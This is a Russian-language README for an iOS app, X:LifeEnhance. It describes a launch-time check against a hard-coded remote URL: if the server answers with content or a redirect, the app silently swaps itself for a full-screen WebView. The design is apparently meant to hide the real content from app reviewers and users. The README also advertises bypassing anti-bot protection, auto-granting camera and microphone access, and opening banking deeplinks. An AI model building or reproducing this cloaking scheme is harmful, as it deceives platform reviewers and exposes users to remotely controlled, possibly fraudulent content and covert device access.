# WebView Integration Documentation

## Обзор

В приложение X:LifeEnhance интегрирована логика из проекта `dafoma_distribution` для проверки сервера и условного отображения WebView или основного приложения.

## Логика работы

При запуске приложения происходит следующее:

1. **Запрос к серверу** - делается GET запрос к `https://lastreflex775.site/f9HZ6KDR`
2. **Анализ ответа**:
   - ✅ **200 с контентом** → показывается WebView
   - ✅ **3xx (редиректы)** → показывается WebView
   - ❌ **200 без контента** → показывается обычное приложение X:LifeEnhance
   - ❌ **4xx, 5xx ошибки** → показывается обычное приложение X:LifeEnhance
   - ❌ **Ошибки сети** → показывается обычное приложение X:LifeEnhance

## Файлы интеграции

### 1. DataManager.swift
```
Utils/DataManager.swift
```
Содержит URL сервера для проверки.

### 2. WebViewSystem.swift
```
Utils/WebViewSystem.swift
```
Мощный WebView контроллер с полной поддержкой:
- ✅ WebRTC (камера/микрофон)
- ✅ Popup окна (sheet модалки)
- ✅ Deeplinks (Telegram, банки, и т.д.)
- ✅ JavaScript alerts/confirms
- ✅ Cookies сохранение/восстановление
- ✅ Кастомный User-Agent
- ✅ Полная поддержка мультимедиа
- ✅ Обход anti-bot защиты

### 3. RootView.swift
```
RootView.swift
```
Корневой view с логикой проверки сервера и условного рендеринга.

### 4. X_LifeEnhanceApp.swift
```
X_LifeEnhanceApp.swift
```
Обновлен для использования RootView вместо прямого ContentView.

## WebView возможности

### Popup окна
WebView поддерживает открытие popup окон в виде bottom sheet с:
- Закругленными углами
- Затемненным фоном
- Кнопкой закрытия
- Свайп-индикатором
- Плавными анимациями

### Deeplinks
Автоматическая обработка диплинков:
- `tg://` - Telegram
- `sberbank://` - Сбербанк
- `whatsapp://` - WhatsApp
- И другие популярные приложения

С защитой от:
- Спама алертов
- Повторных попыток
- Слишком частых уведомлений

### Cookies
Полное сохранение и восстановление cookies между сессиями.

### WebRTC
Поддержка видео/аудио чатов с автоматическим разрешением доступа к камере/микрофону.

## Настройка сервера

Чтобы изменить URL сервера, отредактируйте файл:
```swift
Utils/DataManager.swift

struct DataManagers {
    let server: String = "ВАШ_URL_ЗДЕСЬ"
}
```

## Тестирование

1. **Тест WebView** - сервер отвечает 200 с контентом или делает редирект
2. **Тест обычного приложения** - сервер недоступен или возвращает ошибку

## AppStorage флаги

- `isBlock` - флаг блокировки (true = показать приложение, false = показать WebView)
- `silka` - последний URL в WebView (для восстановления)
- `first_open` - флаг первого запуска
- `hasCompletedOnboarding` - флаг завершения онбординга (для основного приложения)
